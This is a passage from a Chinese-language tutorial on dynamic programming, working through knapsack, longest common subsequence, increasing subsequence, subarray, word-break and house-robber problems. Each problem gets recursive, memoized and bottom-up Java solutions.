Solution4 so = new Solution4();\n    System.out.println(so.rob(new int[]{1, 2, 3, 1, 3}));\n  }\n}\n\nclass Solution4 {\n  public int rob(int[] nums) {\n    int length = nums.length;\n    if (length == 1) return nums[0]; \n    if (length == 2) return Math.max(nums[0], nums[1]);\n    int[] dp = new int[length];\n    dp[0] = nums[0];\n    dp[1] = Math.max(nums[0], nums[1]);\n    for (int i = 2; i < length; i++) {\n      dp[i] = Math.max(dp[i-1], dp[i-2] + nums[i]);\n    }\n    return dp[length-1];\n  }\n}\n```\n\n### 0-1背包问题\n[0-1背包问题-模板题](https://www.acwing.com/problem/content/2/)\n\n分析：\n当输入为：\n```\n4 5\n1 2\n2 4\n4 4\n4 5\n```\n递归树：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408164308.png)\n\n代码：\n```java\nclass Solution1 {\n\n  public int solution(int N, int V, int[] v, int[] w) {\n    return dfs(N, V, v, w);\n  }\n\n  private int dfs(int nowN, int nowV, int[] v, int[] w) {\n    if (nowN == 1) {\n      if (nowV >= v[1]) {\n        return w[1];\n      }\n      return 0;\n    } \n\n    int min = Integer.MIN_VALUE;\n    if (nowV >= v[nowN] ) {\n      min = dfs(nowN - 1, nowV - v[nowN], v, w) + w[nowN];\n    }\n\n    return Math.max(min, dfs(nowN - 1, nowV, v, w));\n  }\n  \n}\n```\n**子问题分析：**\n- 子问题的范围: 当在前nowN个物品（包括第nowN个物品）中选，且背包容量为nowV时\n- 子问题的属性：总价值最大\n\n经过分析：发现子问题符合`无后效性`\n\n我们发现出现子问题重复计算的情况，因此我们用备忘录来存储子问题；\n此处的备忘录可以设置为`dp[nowN][nowV]`, 表示当在前nowN个物品（包括第nowN个物品）中选，且背包容量为nowV时, 总价值最大为`dp[nowN][nowV]`\n定义完备忘录后，简化递归树:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408164321.png)\n\n代码：\n```java\nclass Solution2 {\n\n  private Integer[][] dp = null; \n\n  public int solution(int N, int V, int[] v, int[] w) {\n    dp = new Integer[N+1][V+1];\n    return dfs(N, V, v, w);\n  }\n\n  private int dfs(int nowN, int nowV, int[] v, int[] w) {\n    if (nowN == 1) {\n      if (nowV >= v[1]) {\n        return w[1];\n      }\n      return 0;\n    } \n    if (nowV >= v[nowN] ) {\n      if (dp[nowN - 1][nowV - v[nowN]] == null) {\n        dp[nowN - 1][nowV - v[nowN]] = dfs(nowN - 1, nowV - v[nowN], v, w);\n      }\n    } \n    if (dp[nowN - 1][nowV] == null) {\n      dp[nowN - 1][nowV] = dfs(nowN - 1, nowV, v, w);\n    } \n    return Math.max(nowV >= v[nowN] ? dp[nowN - 1][nowV - v[nowN]] + w[nowN] : 0, dp[nowN - 1][nowV]);\n  }\n  \n}\n```\n\n通过分析发现，可以推出备忘录中的各个数据之间的通项公式为\n$$dp[nowN][nowV] = \\begin{cases}\ndp[nowN-1][nowV] & nowV < v[nowN] \\\\\nmax(dp[nowN - 1][nowV - v[nowN]] + w[nowN], dp[nowN - 1][nowV]) & nowV \\geq v[nowN] \\\\\n\\end{cases}$$\n\n\n所以可以使用从底向上法，代码如下：\n```java\nclass Solution3 {\n  public int solution(int N, int V, int[] v, int[] w) {\n    int[][] dp = new int[N+1][V+1];\n    for (int nowN = 1; nowN <= N; nowN++) {\n      for (int nowV = 0; nowV <= V; nowV++) {\n        if (nowV < v[nowN]) {\n          dp[nowN][nowV] = dp[nowN - 1][nowV];\n        } else {\n          dp[nowN][nowV] = Math.max(dp[nowN - 1][nowV - v[nowN]] + w[nowN], dp[nowN - 1][nowV]);\n        }\n      }\n    }\n    return dp[N][V]; \n  }\n}\n```\n可以使用滚动数组讲将dp数组从二维降到一维，代码如下：\n```java\nclass Solution {\n  public int solution(int N, int V, int[] v, int[] w) {\n    int[] dp = new int[V+1];\n    for (int i = 1; i <= N; i++) {\n      for (int j = V; j >= v[i]; j--) {\n        dp[j] = Math.max(dp[j], dp[j - v[i]] + w[i]);\n      }\n    }\n    return dp[V]; \n  }\n}\n```\n\n### 完全背包问题\n[完全背包问题-模板题](https://www.acwing.com/problem/content/3/)\n完全背包问题与0-1背包问题的不同点在于完全背包问题中的每种物品都有无限件可用\n\n分析：\n当输入为：\n```\n4 5\n1 2\n2 4\n4 4\n4 5\n```\n递归树：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408164333.png)\n\n代码：\n```java\nclass Solution1 {\n  public int solution(int N, int V, int[] v, int[] w) {\n    return dfs(N, V, v, w);\n  }\n  \n  private int dfs(int nowN, int nowV, int[] v, int[] w) {\n    if (nowN == 1) {\n      return nowV / v[1] * w[1];\n    }\n    int maxNum = nowV / v[nowN];\n    int max = Integer.MIN_VALUE;\n    for (int i = 0; i <= maxNum; i++) {\n      max = Math.max(max, dfs(nowN - 1, nowV - i * v[nowN], v, w) + i * w[nowN]);\n    }\n    return max;\n  }\n}\n```\n**子问题分析：**\n- 子问题的范围: 当在前nowN个物品（包括第nowN个物品）中选，且背包容量为nowV时\n- 子问题的属性：总价值最大\n\n经过分析：发现子问题符合`无后效性`\n\n我们发现出现子问题重复计算的情况，因此我们用备忘录来存储子问题；\n此处的备忘录可以设置为`dp[nowN][nowV]`, 表示当在前nowN个物品（包括第nowN个物品）中选，且背包容量为nowV时, 总价值最大为`dp[nowN][nowV]`\n定义完备忘录后，简化递归树:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408164352.png)\n\n代码：\n```java\nclass Solution2 {\n  private Integer[][] dp = null;\n\n  public int solution(int N, int V, int[] v, int[] w) {\n    dp = new Integer[N + 1][V + 1];\n    return dfs(N, V, v, w);\n  }\n  \n  private int dfs(int nowN, int nowV, int[] v, int[] w) {\n    if (nowN == 1) {\n      return nowV / v[1] * w[1];\n    }\n    int maxNum = nowV / v[nowN];\n    int max = Integer.MIN_VALUE;\n    for (int i = 0; i <= maxNum; i++) {\n      if (dp[nowN - 1][nowV - i * v[nowN]] == null) {\n        dp[nowN - 1][nowV - i * v[nowN]] = dfs(nowN - 1, nowV - i * v[nowN], v, w); \n      } \n      max = Math.max(max, dp[nowN - 1][nowV - i * v[nowN]] + i * w[nowN]);\n    }\n    return max;\n  }\n}\n```\n\n通过分析发现，于是易得状态转移方程：\n`$dp[nowN][nowV]=max( dp[nowN−1][nowV], dp[nowN−1][nowV−v[nowN]]+w[nowN], dp[nowN-1][nowV−2*v[nowN]]+2*w[nowN],...)$`\n\n但是这个东西项数太多，想办法把它转换成两项\n\n由上面的状态转移方程我们可以得到：\n`$dp[nowN][nowV−v[nowN]]=max(dp[nowN−1][nowV−v[nowN]], dp[nowN−1][nowV−2*v[nowN]]+w[nowN], dp[nowN−1][nowV−3*v[nowN]]+2*w[nowN] ,...)$`\n观察得到，上面的第二项后面的每一项都是下面的每一项加上一个$W_i$。\n\n于是我们可以得到状态转移方程：\n$dp[nowN][nowV]=max(dp[nowN−1][nowV] , dp[nowN][nowV-v[nowN]]+w[nowN]$\n\n$$dp[nowN][nowV] = \\begin{cases}\ndp[nowN-1][nowV] & nowV < v[nowN] \\\\\nmax(dp[nowN−1][nowV] , dp[nowN][nowV-v[nowN]]+w[nowN] & nowV \\geq v[nowN] \\\\\n\\end{cases}$$\n\n代码：\n```java\nclass Solution3 {\n\n  private int[][] dp;\n\n  public int solution(int N, int V, int[] v, int[] w) {\n    dp = new int[N + 1][V + 1];\n    for (int nowN = 1; nowN <= N; nowN++) {\n      for (int nowV = 0; nowV <= V; nowV++) {\n        if (nowV < v[nowN]) {\n          dp[nowN][nowV] = dp[nowN - 1][nowV];\n        } else {\n          dp[nowN][nowV] = Math.max(dp[nowN - 1][nowV], dp[nowN][nowV -v[nowN]] + w[nowN]);\n        }\n      }\n    }\n    return dp[N][V];\n  }\n}\n```\n\n### 最长公共子序列\n[最长公共子序列](https://leetcode.cn/problems/qJnOS7/)\n\n给定两个字符串 text1 和 text2，返回这两个字符串的最长 公共子序列 的长度。如果不存在 公共子序列 ，返回 0 。\n\n一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。\n- 例如，\"ace\" 是 \"abcde\" 的子序列，但 \"aec\" 不是 \"abcde\" 的子序列。\n两个字符串的 公共子序列 是这两个字符串所共同拥有的子序列。\n\n示例 1：\n```txt\n输入：text1 = \"abcde\", text2 = \"ace\" \n输出：3  \n解释：最长公共子序列是 \"ace\" ，它的长度为 3 。\n```\n\n示例 2：\n```txt\n输入：text1 = \"abc\", text2 = \"abc\"\n输出：3\n解释：最长公共子序列是 \"abc\" ，它的长度为 3 。\n```\n\n示例 3：\n```txt\n输入：text1 = \"abc\", text2 = \"def\"\n输出：0\n解释：两个字符串没有公共子序列，返回 0 。\n```\n\n#### 分析\n\n递归树：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220511200641.png)\n\n代码:\n\n```java\nclass Solution {\n\n\tpublic int longestCommonSubsequence(String text1, String text2) {\n\t\treturn dfs(0, 0, text1, text2);\n\t}\n\n\tprivate int dfs(int i, int j, String text1, String text2) {\n\t\tif (i == text1.length() || j == text2.length()) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (text1.charAt(i) == text2.charAt(j)) {\n\t\t\tint temp = dfs(i + 1, j + 1, text1, text2) + 1;\n\t\t\treturn temp;\n\t\t}\n\t\tint temp = Math.max(dfs(i + 1, j, text1, text2), dfs(i, j + 1, text1, text2));\n\t\treturn temp;\n\t}\n\n}\n\npublic class MainOfferII095 {\n\tpublic static void main(String[] args) {\n\t\tSolution solution = new Solution();\n\t\tSystem.out.println(solution.longestCommonSubsequence(\"abcde\", \"ace\"));\n\t}\n}\n```\n\n子问题分析：\n- 子问题的范围: 第一个字符串从第i个字符到最后一个字符的子串与第二个字符串从第j个字符开始到最后一个字符到子串之间的最长公共子序列\n- 子问题的属性：最长公共子序列的长度\n\n经过分析：发现子问题符合`无后效性`\n\n我们发现出现重复计算的情况，因此我们用备忘录来存储子问题；\n\n此处的备忘录可以设置为`dp[i][j]`, 表示第一个字符串从第i个字符到最后一个字符的子串与第二个字符串从第j个字符开始到最后一个字符到子串之间的最长公共子序列的长度为`dp[i][j]`\n\n定义完备忘录后，简化递归树:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220511203152.png)\n\n代码：\n```java\nclass SolutionOfferII095 {\n\n\tprivate Integer[][] dp;\n\n\tpublic int longestCommonSubsequence(String text1, String text2) {\n\t\tdp = new Integer[text1.length() + 1][text2.length() + 1];\n\t\treturn dfs(0, 0, text1, text2);\n\t}\n\n\tprivate int dfs(int i, int j, String text1, String text2) {\n\t\tif (i == text1.length() || j == text2.length()) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (text1.charAt(i) == text2.charAt(j)) {\n\t\t\tif (dp[i + 1][j + 1] == null) {\n\t\t\t\tdp[i + 1][j + 1] = dfs(i + 1, j + 1, text1, text2);\n\t\t\t}\n\t\t\treturn dp[i + 1][j + 1] + 1;\n\t\t}\n\t\tif (dp[i + 1][j] == null) {\n\t\t\tdp[i + 1][j] = dfs(i + 1, j, text1, text2);\n\t\t} \n\t\tif (dp[i][j + 1] == null) {\n\t\t\tdp[i][j + 1] = dfs(i, j + 1, text1, text2);\n\t\t} \n\t\tint temp = Math.max(dp[i + 1][j], dp[i][j + 1]);\n\t\treturn temp;\n\t}\n\n}\n\npublic class MainOfferII095 {\n\tpublic static void main(String[] args) {\n\t\tSolutionOfferII095 solution = new SolutionOfferII095();\n\t\tSystem.out.println(solution.longestCommonSubsequence(\"abcde\", \"ace\"));\n\t}\n}\n```\n\n通过分析发现，可以推出备忘录中的各个数据之间的通项公式为\n\n$$dp[i][j] = \\begin{cases}\ndp[i + 1][j + 1] + 1& text1[i] = text2[j] \\\\\nmax(dp[i + 1][j] , dp[i][j + 1] & text1[i] != text2[j] \\\\\n\\end{cases}$$\n\n代码：\n```java\nclass SolutionOfferII095 {\n\tprivate Integer[][] dp;\n\n\tpublic int longestCommonSubsequence(String text1, String text2) {\n\t\tdp = new Integer[text1.length() + 1][text2.length() + 1];\n\t\treturn dp(text1, text2);\n\t}\n\n\tprivate int dp(String text1, String text2) {\n\n\t\tdpInit(text1, text2);\n\n\t\tfor (int i = text1.length() - 1; i > -1; i--) {\n\t\t\tfor (int j = text2.length() - 1; j > -1; j--) {\n\t\t\t\tif (text1.charAt(i) == text2.charAt(j)) {\n\t\t\t\t\tdp[i][j] = dp[i + 1][j + 1] + 1;\n\t\t\t\t} else {\n\t\t\t\t\tdp[i][j] = Math.max(dp[i + 1][j], dp[i][j + 1]);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn dp[0][0];\n\t}\n\n\tprivate void dpInit(String text1, String text2) {\n\t\tfor (int i = 0; i <= text1.length(); i++) {\n\t\t\tdp[i][text2.length()] = 0;\n\t\t}\n\n\t\tfor (int i = 0; i <= text2.length(); i++) {\n\t\t\tdp[text1.length()][i] = 0;\n\t\t}\n\t}\n}\n\npublic class MainOfferII095 {\n\tpublic static void main(String[] args) {\n\t\tSolutionOfferII095 solution = new SolutionOfferII095();\n\t\tSystem.out.println(solution.longestCommonSubsequence(\"abcde\", \"ace\"));\n\t}\n}\n```\n\n## 分类\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1eUgyZnhG-hzndjY6eGhgQBQrBpx8q_I5/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1JfH11RG_lcWEsJil6HXQyoVM408PN1QW/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n视频链接：\n- https://www.youtube.com/watch?v=0t9Dnc2rOz4\n- https://www.youtube.com/watch?v=oN3jLuYTWKc\n- https://www.youtube.com/watch?v=F_FOlOTStWE\n- https://www.youtube.com/watch?v=jBOz9NTJ-Ko\n\n### 序列上按结尾位置规划之单序列\n#### 分析模版\n- 状态：dp[i]=\"所有在i位置（选中第i位置）结束的对象中\"，最优的解\n- 下一个状态：dp[i - 1], dp[i - 2], ... , dp[0] \n\n#### 例题1: 最长递增子序列\n[最长递增子序列](https://leetcode.cn/problems/longest-increasing-subsequence/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220614102644.png)\n\n##### 分析\n\n- 状态：dp[i]=\"**以arr[i]结尾**的最长递增子序列的长度\"\n- 下一个状态：dp[j], if 0 <= j < i && arr[j] < arr[i]\n- 父子状态之间的递推关系：dp[i] = max{dp[j] + 1, if 0 <= j < i && arr[j] < arr[i]}\n- 初始条件：dp[0] = 1\n- 最后的解答：dp数组中最大值\n\n##### 分治法之递归树\n以`nums = [0,1,0,3,2,3]`为例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220619181240.png)\n\n##### 递归\n```java\nclass Solution {\n  int ans = -1;\n  int[] nums;\n  public int lengthOfLIS(int[] nums) {\n    this.nums = nums;\n    dfs(nums.length);\n    return ans - 1;\n  }\n\n  int dfs(int i) {\n    int res = 1;\n    for (int j = i - 1; j >= 0; j--) {\n      if (i == nums.length || nums[j] < nums[i]) {\n        res = Math.max(res, dfs(j) + 1);\n      }\n    }\n    ans = Math.max(ans, res);\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int ans = -1;\n  int[] nums;\n  int[] dp;\n  public int lengthOfLIS(int[] nums) {\n    this.nums = nums;\n    dp = new int[nums.length + 1];\n    dfs(nums.length);\n    return ans - 1;\n  }\n\n  int dfs(int i) {\n    int res = 1;\n    for (int j = i - 1; j >= 0; j--) {\n      if (i == nums.length || nums[j] < nums[i]) {\n        if (dp[j] == 0) {\n          dp[j] = dfs(j);\n        }\n        res = Math.max(res, dp[j] + 1);\n      }\n    }\n    ans = Math.max(ans, res);\n    return res;\n  }\n}\n```\n\n##### 递推式动态规划\n\n```java\nclass Solution {\n  public int lengthOfLIS(int[] nums) {\n    int[] dp = new int[nums.length];\n    dp[0] = 1;\n    int res = dp[0];\n    for (int i = 1; i < nums.length; i++) {\n      dp[i] = 1;\n      for (int j = 0; j < i; j++) {\n        if (nums[j] < nums[i]) {\n          dp[i] = Math.max(dp[i], dp[j] + 1);\n        }\n      }\n      res = Math.max(res, dp[i]);\n    }\n    return res;\n  }\n}\n```\n\n#### 例题2: 最大子数组和\n[最大子数组和](https://leetcode.cn/problems/maximum-subarray/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220614104309.png)\n\n##### 分析\n\n- 状态：dp[i]=\"**以nums[i]结尾**的连续子数组中，可以产生的最大和\"\n- 下一个状态：dp[i - 1] \n- 父子状态之间的递推关系：dp[i] = max{nums[i], dp[i - 2] + nums[i]};\n- 初始条件：dp[0] = nums[0]\n- 最后的解答：dp数组中最大值\n\n##### 分治法之递归树\n以`nums = [-2,1,-3,4,-1,2,1,-5,4]`为例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220619164944.png)\n\n##### 递归\n\n```java\nclass Solution {\n  int[] nums;\n  int ans = Integer.MIN_VALUE;\n  public int maxSubArray(int[] nums) {\n    this.nums = nums; \n    dfs(nums.length - 1);\n    return ans;\n  }\n  \n  int dfs(int i) {\n    if (i == 0) {\n      ans = Math.max(ans, nums[0]);\n      return nums[0];\n    }\n    int res = Math.max(nums[i], nums[i] + dfs(i - 1));\n    ans = Math.max(ans, res);\n    return res;\n  }\n}\n```\n\n##### 递推式动态规划\n\n代码：\n```java\nclass Solution {\n  public int maxSubArray(int[] nums) {\n    int[] dp = new int[nums.length];\n    dp[0] = nums[0];\n    int res = dp[0];\n    for (int i = 1; i < nums.length; i++) {\n      dp[i] = Math.max(dp[i - 1] + nums[i], nums[i]);\n      res = Math.max(res, dp[i]);\n    }\n    return res;\n  }\n}\n```\n\n#### 例题3: 乘积最大子数组\n[乘积最大子数组](https://leetcode.cn/problems/maximum-product-subarray/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220614110829.png)\n\n##### 分析\n- 状态：dp[i]=\"**以nums[i]结尾**的连续子数组中，可以产生的最大乘积`dp[i][0]`与最小乘积`dp[i][1]`\"\n- 下一个状态：dp[i - 1]\n- 父子状态之间的递推关系：\n  - `dp[i][0] = Math.max(nums[i], Math.max(dp[i - 1][0] * nums[i], dp[i - 1][1] * nums[i]));`\n  - `dp[i][1] = Math.min(nums[i], Math.min(dp[i - 1][0] * nums[i], dp[i - 1][1] * nums[i]));`\n- 初始条件：dp[0] = new int[]{nums[0], nums[0]}\n- 最后的解答：dp数组中最大值\n\n##### 分治法之递归树\n以`nums = [2,3,-2,4]`为例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220619193928.png)\n\n##### 递归\n```java\nclass Solution {\n  int ans = Integer.MIN_VALUE;\n  int[] nums;\n\n  public int maxProduct(int[] nums) {\n    this.nums = nums;\n    dfs(nums.length - 1);\n    return ans;\n  }\n\n  int[] dfs(int i) {\n    if (i == 0) {\n      ans = Math.max(ans, nums[i]);\n      return new int[]{nums[i], nums[i]};\n    }\n    int[] res = new int[]{nums[i], nums[i]};\n    int[] temp = dfs(i - 1);\n    res[0] = Math.max(nums[i], Math.max(nums[i] * temp[0], nums[i] * temp[1]));\n    res[1] = Math.min(nums[i], Math.min(nums[i] * temp[0], nums[i] * temp[1]));\n    ans = Math.max(ans, res[0]);\n    return res;\n  }\n\n}\n```\n\n##### 递推式动态规划\n\n代码：\n```java\nclass Solution {\n  public int maxProduct(int[] nums) {\n    int[][] dp = new int[nums.length][2];\n    dp[0] = new int[]{nums[0], nums[0]};\n    int res = dp[0][0];\n    for (int i = 1; i < nums.length; i++) {\n      dp[i][0] = Math.max(nums[i], Math.max(dp[i - 1][0] * nums[i], dp[i - 1][1] * nums[i]));\n      dp[i][1] = Math.min(nums[i], Math.min(dp[i - 1][0] * nums[i], dp[i - 1][1] * nums[i]));\n      res = Math.max(res, dp[i][0]);\n    }\n    return res;\n  }\n}\n```\n\n#### 例题4: 单词拆分\n[单词拆分](https://leetcode.cn/problems/word-break/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220614141710.png)\n\n##### 分析\n- 状态：dp[i]=\"字符串s前i+1个字符组成的字符串`s[0..i]`是否能被空格拆分成若干个字典中出现的单词\"\n- 下一个状态：dp[j - 1]\n- 父子状态之间的递推关系：dp[i] = (j == 0 || dp[j - 1]) && wordDictSet.contains(s.substring(j, i + 1))\n- 最后的解答：dp[s.length - 1]\n\n##### 分治法之递归树\n以`s = \"applepenapple\", wordDict = [\"apple\", \"pen\"]`为例\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220619201528.png)\n\n##### 递归\n```java\nclass Solution {\n  Set<String> wordDictSet;\n  String s;\n  public boolean wordBreak(String s, List<String> wordDict) {\n    this.s = s;\n    wordDictSet = new HashSet(wordDict);\n    return dfs(s.length() - 1);\n  }\n\n  boolean dfs(int i) {\n    for (int j = i; j >= 0; j--) {\n      if (wordDictSet.contains(s.substring(j, i + 1))) {\n        if (j == 0 || dfs(j - 1)) {\n          return true;\n        }  \n      }\n    }\n    return false;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  Set<String> wordDictSet;\n  String s;\n  Boolean[] dp;\n  public boolean wordBreak(String s, List<String> wordDict) {\n    this.s = s;\n    this.dp = new Boolean[s.length()];\n    wordDictSet = new HashSet(wordDict);\n    return dfs(s.length() - 1);\n  }\n\n  boolean dfs(int i) {\n    for (int j = i; j >= 0; j--) {\n      if (wordDictSet.contains(s.substring(j, i + 1))) {\n        if (j == 0) {\n          return true;\n        }  \n        if (dp[j - 1] == null) {\n          dp[j - 1] = dfs(j - 1);\n        }\n        if (dp[j - 1]) {\n          return true;\n        }\n      }\n    }\n    return false;\n  }\n}\n```\n\n##### 递推式动态规划\n\n代码：\n```java\nclass Solution {\n  public boolean wordBreak(String s, List<String> wordDict) {\n    Set<String> wordDictSet = new HashSet(wordDict);\n    boolean[] dp = new boolean[s.length()];\n    for (int i = 0; i < s.length(); i++) {\n      for (int j = 0; j <= i; j++) {\n        if ( (j == 0 || dp[j - 1]) && wordDictSet.contains(s.substring(j, i + 1))) {\n          dp[i] = true;\n          break;\n        }\n      }\n    }\n    return dp[s.length() - 1];\n  }\n}\n```\n\n#### 例题5: 单词拆分 II\n[单词拆分 II](https://leetcode.cn/problems/word-break-ii/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220615141745.png)\n\n##### 分析\n\n- 状态：dp[i]=\"字符串s前i+1个字符组成的字符串`s[0..i]`是否能被空格拆分成若干个字典中出现的单词\"\n- 下一个状态：dp[j - 1]\n- 父子状态之间的递推关系：dp[i] = (j == 0 || dp[j - 1]) && wordDictSet.contains(s.substring(j, i + 1))\n- 最后的解答：dp[s.length - 1]\n\n##### 递归\n```java\nclass Solution {\n  \n  List<String> ans = new ArrayList();\n  String s;\n  Set<Integer>[] prev;\n  Set<String> wordDictSet;\n\n  public List<String> wordBreak(String s, List<String> wordDict) {\n    this.s = s;\n    wordDictSet = new HashSet(wordDict);\n    prev = new Set[s.length()];\n    for (int i = 0; i < s.length(); i++) {\n      prev[i] = new HashSet();\n    }\n    dfs(s.length() - 1);\n    print(s.length() - 1, \"\");\n    return ans;\n  }\n\n\n  boolean dfs(int i) {\n    boolean flag  = false;\n    for (int j = i; j >= 0; j--) {\n      if (wordDictSet.contains(s.substring(j, i + 1))) {\n        if (j == 0 || dfs(j - 1)) {\n          prev[i].add(j - 1);\n          flag = true;\n        }\n      }\n    }\n    return flag;\n  }\n\n  void print(Integer index, String str) {\n    if (index == -1) {\n      ans.add(str.trim()); \n      return;\n    }\n\n    for (Integer nextIndex : prev[index]) {\n      print(nextIndex, s.substring(nextIndex + 1, index + 1) + \" \" + str);\n    }\n  }\n  \n}\n```\n\n##### 递推式动态规划\n\n代码：\n```java\nclass Solution {\n  \n  List<String> ans = new ArrayList();\n  String s;\n  List<Integer>[] dp;\n\n  public List<String> wordBreak(String s, List<String> wordDict) {\n    this.s = s;\n    Set<String> wordDictSet = new HashSet(wordDict);\n    dp = new List[s.length()];\n    for (int i = 0; i < dp.length; i++) {\n      dp[i] = new ArrayList();\n    }\n    for (int i = 0; i < s.length(); i++) {\n      for (int j = 0; j <= i; j++) {\n        if ((j == 0 || !dp[j - 1].isEmpty()) && wordDictSet.contains(s.substring(j, i + 1))) {\n          dp[i].add(j - 1);\n        }\n      }\n    }\n    dfs(s.length() - 1, \"\");\n    return ans;\n  }\n\n  void dfs(Integer index, String str) {\n    if (index == -1) {\n      ans.add(str.trim()); \n      return;\n    }\n\n    for (Integer nextIndex : dp[index]) {\n      dfs(nextIndex, s.substring(nextIndex + 1, index + 1) + \" \" + str);\n    }\n  }\n}\n```\n\n#### 例题6: 爬楼梯\n[爬楼梯](https://leetcode.cn/problems/climbing-stairs/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220614152002.png)\n\n##### 分析\n- 状态：dp[i]=\"爬到第i阶的方法种数\"\n- 下一个状态：dp[i - 1], dp[i - 2]\n- 父子状态之间的递推关系：dp[i] = dp[i - 1] + dp[i - 2];\n- 初始问题：dp[1] = 1, dp[2] = 2\n- 最后的解答：dp[n]\n\n##### 分治法之递归树\n以`n = 10`为例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220619214508.png)\n\n##### 递归\n```java\nclass Solution {\n  public int climbStairs(int n) {\n    return dfs(n);\n  }\n\n  int dfs(int i) {\n    int res = 0;\n    if (i == 1 || i == 2) {\n      return i;\n    }\n    for (int j = 1; j <= 2; j++) {\n      res += dfs(i - j);\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n\n  Integer[] dp;\n  \n  public int climbStairs(int n) {\n    dp = new Integer[n];\n    return dfs(n);\n  }\n\n  int dfs(int i) {\n    int res = 0;\n    if (i == 1 || i == 2) {\n      return i;\n    }\n    for (int j = 1; j <= 2; j++) {\n      if (dp[i - j] == null) {\n        dp[i - j] = dfs(i - j);\n      }\n      res += dp[i - j];\n    }\n    return res;\n  }\n}\n```\n\n##### 递推式动态规划\n代码：\n```java\nclass Solution {\n  public int climbStairs(int n) {\n    int[] dp = new int[n + 1];\n    dp[1] = 1;\n    if (n == 1) return dp[n];\n    dp[2] = 2;\n    for (int i = 3; i <= n; i++) {\n      dp[i] = dp[i - 1] + dp[i - 2];\n    }\n    return dp[n];\n  }\n}\n```\n\n#### 例题7: 解码方法\n[解码方法](https://leetcode.cn/problems/decode-ways/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220614172954.png)\n\n##### 分析\n- 状态：dp[i]=\"字符串s前i+1个字符组成的字符串`s[0..i]`的编码方法个数\"\n- 下一个状态：dp[i - 1], dp[i - 2]\n\n##### 递归\n```java\nclass Solution {\n  char[] sCh;\n  public int  numDecodings(String s) {\n    sCh = s.toCharArray();\n    return dfs(sCh.length - 1);\n  }\n\n  int dfs(int i) {\n    if (i < 0) {\n      return 1;\n    }\n    int res = 0;\n    if (sCh[i] > '0') {\n      res += dfs(i - 1);\n    }\n    if (i >= 1) {\n      int temp = Integer.valueOf(sCh[i - 1] + \"\" + sCh[i]);\n      if (temp >= 10 && temp <= 26) {\n        res += dfs(i - 2);\n      }\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  char[] sCh;\n  Integer[] dp;\n  public int  numDecodings(String s) {\n    sCh = s.toCharArray();\n    dp = new Integer[sCh.length + 2];\n    return dfs(sCh.length - 1);\n  }\n\n  int dfs(int i) {\n    if (i < 0) {\n      return 1;\n    }\n    int res = 0;\n    if (sCh[i] > '0') {\n      if (dp[i + 1] == null) dp[i + 1] = dfs(i - 1);\n      res += dp[i + 1];\n    }\n    if (i >= 1) {\n      int temp = Integer.valueOf(sCh[i - 1] + \"\" + sCh[i]);\n      if (temp >= 10 && temp <= 26) {\n        if (dp[i] == null) {\n          dp[i] = dfs(i - 2);\n        }\n        res += dp[i];\n      }\n    }\n    return res;\n  }\n}\n```\n\n#### 例题8: 打家劫舍\n[打家劫舍](https://leetcode.cn/problems/house-robber/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220615144422.png)\n\n##### 分析\n- 状态：dp[i]=\"抢了第i家且只能抢前i家时的最高金额\"\n- 下一个状态：dp[j]\n- 父子状态之间的递推关系：dp[i] = Math.max(dp[i], dp[j] + nums[i]);\n- 初始化：dp[0] = nums[0]\n- 最后的解答：dp数组中最大值\n\n##### 递归\n```java\nclass Solution {\n  int[] nums;\n  public int rob(int[] nums) {\n    int n = nums.length;\n    this.nums = nums; \n    int res = Integer.MIN_VALUE;\n    for (int i = n - 1; i >= 0; i--) {\n      res = Math.max(res, dfs(i));\n    }\n    return res;\n  }\n  \n  int dfs(int i) {\n    int res = nums[i];\n    for (int j = i - 2; j >= 0; j--) {\n      res = Math.max(res, dfs(j) + nums[i]);\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] nums;\n  Integer[] dp;\n  public int rob(int[] nums) {\n    int n = nums.length;\n    dp = new Integer[n];\n    this.nums = nums; \n    int res = Integer.MIN_VALUE;\n    for (int i = n - 1; i >= 0; i--) {\n      res = Math.max(res, dfs(i));\n    }\n    return res;\n  }\n  \n  int dfs(int i) {\n    int res = nums[i];\n    for (int j = i - 2; j >= 0; j--) {\n      if (dp[j] == null) dp[j] = dfs(j);\n      res = Math.max(res, dp[j] + nums[i]);\n    }\n    return res;\n  }\n}\n```\n\n#### 例题9: 最长等差数列\n[最长等差数列](https://leetcode.cn/problems/longest-arithmetic-subsequence/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220706095756.png)\n\n##### 分析\n\n- 